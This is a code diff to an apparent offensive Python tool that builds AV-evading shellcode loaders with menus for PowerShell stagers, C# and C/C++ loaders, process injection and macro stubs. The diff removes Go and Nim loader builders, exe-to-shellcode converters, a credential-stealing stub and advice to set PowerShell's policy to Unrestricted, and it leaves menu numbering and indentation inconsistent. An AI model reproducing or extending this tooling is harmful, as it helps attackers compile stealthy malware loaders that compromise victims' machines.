@@ -43,20 +43,7 @@ Injection Mode:
 """
 
 
-Powershell_ExecutionPolicy = DAZZLINGCOLORS.OKRED + """
-                        
-[+]powershell以下六种执行策略:
-[1]Unrestricted 权限最高，可以不受限制执行任意脚本
-[2]Restricted 默认策略，不允许任意脚本的执行
-[3]AllSigned 所有脚本必须经过签名运行
-[4]RemoteSigned 本地脚本无限制，但是对来自网络的脚本必须经过签名
-[5]Bypass *没有任何限制和提示*
-[6]Undefined 没有设置脚本的策略
-[7]查看powershell的默认策略：Get-ExecutionPolicy\n
 
-[!]请确保您的PowerShell的执行策略为:Unrestricted
-[!]如果不是,请在管理员的Powershell权限中执行:Set-ExecutionPolicy Unrestricted\n
-"""
 
 Option_stub = Resource.StringPainting.DynamicPainting.DynaminString()  + """
  bilibli:我不是格林
@@ -101,12 +88,7 @@ with open('Stub/Power_stager.ps1', 'r',encoding='utf-8') as Power_stager:
         Power_stager = Power_stager.read()   
 with open('Stub/Process_Injection.ps1', 'r',encoding='utf-8') as Process_Injection:
         Process_Injection = Process_Injection.read()         
-with open('Stub/Get_Credentials.ps1', 'r',encoding='utf-8') as Get_Credentials:
-        Get_Credentials = Get_Credentials.read() 
         
-with open('Stub/go_loader.go', 'r',encoding='utf-8') as go_loader:
-        go_loader = go_loader.read()   
-
 
 INOTGREEN = Fore.GREEN+ "<GREEN>:"
 
@@ -167,80 +149,14 @@ def other_command(Optionsargs):
 
 
 
-
-
-def exe2shellcode(exe):
-    shellcode = ""
-    with open(exe, "rb")as f:
-        f = f.read()
-        for i in f:
-            if i == 0:
-                pass
-            else:
-
-                if len(str(i)) == 1:
-                    shellcode += "\\x" + "0"+hex(i)[2:]
-                elif i == 10:
-                    shellcode += "\\x" + "0" + hex(i)[2:]
-                elif i == 11:
-                    shellcode += "\\x" + "0" + hex(i)[2:]
-                elif i == 15:
-                    shellcode += "\\x" + "0" + hex(i)[2:]
-                else:
-                    shellcode += "\\x" + hex(i)[2:]
-                # shellcode += "\\x" + hex(i)[2:]
-    return (shellcode)
-
-
-def exec2shellcode():
-    exe = input("请输入exe文件:")
-    a = ", 0x"
-    b = ""
-    shellcode = exe2shellcode(exe)
-    shellcode = "00" + shellcode.replace("\\x", a)
-    shellcode = shellcode.replace("00, ", b)
-    counts = 0
-    
-    for line in shellcode:
-        time = line.count(",")
-        counts += time
-    print("%s出现的次数:%d"%(str,counts))
-
-    
-    with open("shellcode.txt", "a")as file:
-        file.write(shellcode)
-
-
-def exe2base64encode(self):
-    if os.path.exists("base64encode.txt") == True:
-        os.system("del base64encode.txt")
-        print("[+] 已删除base64encode.txt")
-
-    fr = open(self, 'rb')
-    while True:
-        piece = fr.read(75232000)
-        if not piece:
-            break
-        fw = open('base64encode.txt', 'wb')
-        fw.write(base64.b64encode(piece))
-        fw.close()
-    fr.close()
-    os.system("base64encode.txt")
-
 def GetDesktopPath():
     return os.path.join(os.path.expanduser("~"), 'Desktop')
 
 
-
-
-
-
-
-
 def main(powershell_to_vbs, PowerShell_stub, Power_loader, Cpp_injection_mode_options, 
          nim_socket, PowerShell_Socket,Macro_stub, Csharp_stub, AES_Encrypt_stub, 
-         process_hollow_stub, base64_shellcode, powershell_payload,loader_nim,Get_Credentials,Power_stager,
-         Process_Injection,go_loader,verbose):
+         process_hollow_stub, base64_shellcode, powershell_payload,Power_stager,
+         Process_Injection,verbose):
     # print(stub)
     print(Option_stub)
     while True:
@@ -254,13 +170,9 @@ def main(powershell_to_vbs, PowerShell_stub, Power_loader, Cpp_injection_mode_op
                       "|                                                   | \n"
                       "|1.C/C++ Staglesss ShellCode(bin)(单阶段加载)       |  \n"
                       "|                                                   | \n"
-                      "|2.Golang ShellCode loader                          | \n"
+                      "|2.PowerShell Stager loader(多阶段加载)             |  \n"
                       "|                                                   | \n"
-                      "|3.PowerShell Stager loader(多阶段加载)             |  \n"
-                      "|                                                   | \n"
-                      "|4.Nim ShellCode Loader                             | \n"
-                      "|                                                   | \n"
-                      "|5.C#.NET shellcode Loader                          | \n"
+                      "|3.C#.NET shellcode Loader                          | \n"
                       "|                                                   | \n"
                       "+----------+----+--------------------------+--------+ \n")
                                 
@@ -276,8 +188,6 @@ def main(powershell_to_vbs, PowerShell_stub, Power_loader, Cpp_injection_mode_op
                     #file = input(DAZZLINGCOLORS.OKGREEN + "请输入raw格式的文件:\n" +INOTGREEN)
                     filepath = ReadFilePath('bin')
                     print(filepath)
-                    
-                    
                     print("\n")
                     print(DAZZLINGCOLORS.OKPINK + 
                         "+----------+----+--------------------------+--------+\n"
@@ -334,57 +244,9 @@ def main(powershell_to_vbs, PowerShell_stub, Power_loader, Cpp_injection_mode_op
                         continue
                 
                 
-                if Bypass_choice == "2":
-                    print(Resource.StringPainting.DynamicPainting.DynaminString() + DAZZLINGCOLORS.OKPINK + 
-                      "\nPlease select shellcode loader:\n"
-                      "+----------+----+--------------------------+--------+ \n"
-                      "|                                                   |\n"
-                      "|1.Read shellcode Loading                           | \n"
-                      "|                                                   | \n"
-                      "+----------+----+--------------------------+--------+ \n")
+            
                     
-                    Loader_Module = input(INOTGREEN)
-                    if Loader_Module == "1":
-                        
-                        infile = ReadFilePath("bin")
-                        (file, ext) = os.path.splitext(infile)
-                        (path, filename) = os.path.split(infile) 
-                        with open(infile, 'rb') as contents:
-                            save = contents.read()
-                        print(DAZZLINGCOLORS.OKGREEN + "[+] Enable Verbose Messages")
-                        with open(GetDesktopPath()+"\\"+filename, 'wb') as contents:
-                            contents.write(b"\x90"*10000)
-                            contents.write(save)
-                            contents.close()
-                        go_loader = go_loader.replace("REPLACE_FILE", filename)
-                        
-                    
-                        sleep(1)
-                        print(DAZZLINGCOLORS.OKGREEN + "[+] Save new stub to stub.ps1")
-                        sleep(1)
-                        print(DAZZLINGCOLORS.OKGREEN + "[+] Compiling new stubs...")
-
-                        outfile = GetDesktopPath()+"\\go_loader.exe"
-                        with open("go_loader.go", 'w') as contents:
-                            contents.write(go_loader)
-                        if os.path.exists(outfile) == True:
-                            os.system("""del "{0}"\n""".format(outfile))
-                        try:
-                            os.system("""go build -o "{0}" go_loader.go""".format(outfile))
-                            
-                            if os.path.exists(outfile) == True:
-                                print(DAZZLINGCOLORS.OKGREEN +"""[!]  Compile Successfully:"{0}"\n""".format(outfile))
-                            else:
-                                print(DAZZLINGCOLORS.OKGREEN +"[!]Compilation failed\n")
-                            #os.system("del go_loader.go")
-                            break
-                        except:
-                            continue
-                        
-                    
-                    
-                    
-                if Bypass_choice == "3": #Powershell加载器
+                if Bypass_choice == "2": #Powershell加载器
                         print(Resource.StringPainting.DynamicPainting.DynaminString() + DAZZLINGCOLORS.OKPINK + 
                         "\nPlease select shellcode loader:\n"
                         "+----------+----+--------------------------+--------+\n"
@@ -453,94 +315,9 @@ def main(powershell_to_vbs, PowerShell_stub, Power_loader, Cpp_injection_mode_op
                             break
                             
 
-                if Bypass_choice == "4":  # \Nim加载shellcode
-                    
-                    print(Resource.StringPainting.DynamicPainting.DynaminString() + DAZZLINGCOLORS.OKPINK + 
-                      "\nPlease select shellcode loader:\n"
-                      "+----------+----+--------------------------+--------+\n"
-                      "|                                                   |\n"
-                      "|1.Automation_loader                                |\n"
-                      "|                                                   |\n"
-                      "|2.shellcode_Read                                   |\n"
-                      "|                                                   |\n"
-                      "+----------+----+--------------------------+--------+\n")
-                    
-                    Choice = input(INOTGREEN)
-                    if Choice == "1":
-                        url = input(Resource.StringPainting.DynamicPainting.DynaminString() + "\nEnter URL\n" +INOTGREEN)
-                        PowerShell_stub = PowerShell_stub.replace("GREEN", url)
-                        # print(PowerShell_stub)
-                        PowerShell_stubEncryption = base64.b64encode(PowerShell_stub.encode('utf-8')).decode("utf-8")
-                        Power_loader = Power_loader.replace("NIM_RETURN", PowerShell_stubEncryption)
-                        if os.path.exists("stub.exe") == True:
-                            os.system("del stub.exe")
-                        print(DAZZLINGCOLORS.OKGREEN + "[+] Enable Verbose Messages")
-                        writefile = open("stub.nim", "w")
-                        writefile.write(Power_loader)
-                        writefile.close()
-                        sleep(1)
-                        print(DAZZLINGCOLORS.OKGREEN + "[+] Save new stub to stub.nim")
-                        sleep(1)
-                        print(DAZZLINGCOLORS.OKGREEN + "[+] Embedding demo.ico Nim assembly, Don't change its location")
-                        print(DAZZLINGCOLORS.OKGREEN + "[+] Compiling new stubs...")  
-                        
-                        outfile = GetDesktopPath() + "\\stub.exe"
-                        if os.path.exists(outfile) == True:
-                            os.system("""del "{0}"\n""".format(outfile))
-                        try:
-                            os.system("""nim c --hints:off --warnings:off -d:danger -d:mingw -d:strip --app:gui -o:"{0}" stub.nim""".format(outfile))
-                            if os.path.exists(outfile) == True:
-                                print(randomcolor() + "[!] Compile Successfully:{0}\n\n".format(outfile))
-                            else:
-                                print(randomcolor() + "[!] Compilation failed\n\n")
-                            os.system("del stub.nim")
-                            break
-                        except:
-                            continue
-                        
-                        
-                    if Choice == "2":
-                        infile = ReadFilePath("bin")
-                        (file, ext) = os.path.splitext(infile)
-                        (path, filename) = os.path.split(infile) 
-                        with open(infile, 'rb') as contents:
-                            save = contents.read()
-                        print(DAZZLINGCOLORS.OKGREEN + "[+] Enable Verbose Messages")
-                        with open(GetDesktopPath()+"\\"+filename, 'wb') as contents:
-                            contents.write(b"\x90"*10000)
-                            contents.write(save)
-                            contents.close()
-                        loader_nim = loader_nim.replace("REPLACE_FILE", filename)
-                        sleep(1)
-                        
-                        loaderpath = GetDesktopPath() + "\\loader.exe"
-                        print(DAZZLINGCOLORS.OKGREEN +"[+] Generating new stubs ")
-                        with open("loader_nim.nim", 'w') as stub:
-                            stub.write(loader_nim)
-                        if os.path.exists(loaderpath) == True:
-                            os.system("""del "{0}"\n""".format(loaderpath))
-                            print(DAZZLINGCOLORS.OKGREEN +"[+] deleted the old loader_nim.exe")
-                        
-                        
-                        sleep(1)
-                        try:
-                            print(DAZZLINGCOLORS.OKGREEN +"[+] Save new stub to loader_nim.nim...")
-                            sleep(1)
-                            print(DAZZLINGCOLORS.OKGREEN +"[+] Compiling new stubs")
-                            os.system("""nim c --hints:off --warnings:off -d:danger -d:mingw -o:"{0}" --app:gui loader_nim.nim""".format(loaderpath))
-                            if os.path.exists(loaderpath) == True:
-                                print(randomcolor() +"[!] Compile Successfully:{0} && {1}\n\n".format(loaderpath, filename))
-                                
-                                
-                            else:
-                                print(randomcolor() +"[!] Compilation failed\n]n")
-                            os.system("del loader_nim.nim") 
-                            break
-                        except:
-                            continue
-                                
+             
                 
-                if Bypass_choice == "5":
+                if Bypass_choice == "3":
                     print(Resource.StringPainting.DynamicPainting.DynaminString() + DAZZLINGCOLORS.OKPINK +
                           "\n(Loader Module):\n"
                           "+----------+----+--------------------------+--------+\n"
@@ -702,11 +479,7 @@ def main(powershell_to_vbs, PowerShell_stub, Power_loader, Cpp_injection_mode_op
                       "+----------+----+--------------------------+\n"
                       "| 1.ps1_to_vbs(stage)                      |\n"
                       "*                                          *\n"
-                      "| 2.exe__to_base64Encode                   |\n"
-                      "*                                          *\n"
-                      "| 3.exe_to_ps1                             |\n"
-                      "*                                          *\n"
-                      "| 4.base64_to_shellcode(hex)               |\n"
+                      "| 3.C#_to_ps1                             |\n"
                       "*                                          *\n"
                       "| 5.ps1_to_vbs(stageless)                  |\n"
                       "+----------+----+--------------------------+\n")
@@ -747,7 +520,7 @@ def main(powershell_to_vbs, PowerShell_stub, Power_loader, Cpp_injection_mode_op
                 
                 
                 
-                if formatopions == "2": #2.exe__to_base64Encode 
+    
                     print("请选择你的文件(Select your file)")
                     FilePath = ReadFilePath("exe")
                     print(FilePath)
@@ -760,7 +533,7 @@ def main(powershell_to_vbs, PowerShell_stub, Power_loader, Cpp_injection_mode_op
                         break
                     except:
                         continue
-                if formatopions == "3":  #3.exe_to_ps1 
+                if formatopions == "3":  #3.C#_to_ps1 
                     print("请选择你的文件(Select your file)\n" + INOTGREEN)
                     FilePath = ReadFilePath("exe")
                     if os.path.exists("payload.bin"):
@@ -788,9 +561,7 @@ def main(powershell_to_vbs, PowerShell_stub, Power_loader, Cpp_injection_mode_op
                         
                     except:
                         continue
-                    
-                    
-                    
+                 
                 if  formatopions == "4": #4.ps1_to_exe  
                     print(Resource.StringPainting.DynamicPainting.DynaminString())
                         
@@ -1056,5 +827,5 @@ def main(powershell_to_vbs, PowerShell_stub, Power_loader, Cpp_injection_mode_op
 main(powershell_to_vbs, PowerShell_stub, Power_loader, 
      Cpp_injection_mode_options, nim_socket, PowerShell_Socket, 
      Macro_stub, Csharp_stub, AES_Encrypt_stub, process_hollow_stub, 
-     base64_shellcode, powershell_payload, loader_nim, Get_Credentials,
-     Power_stager,Process_Injection,go_loader,verbose=True)
+     base64_shellcode, powershell_payload,
+     Power_stager,Process_Injection,verbose=True)
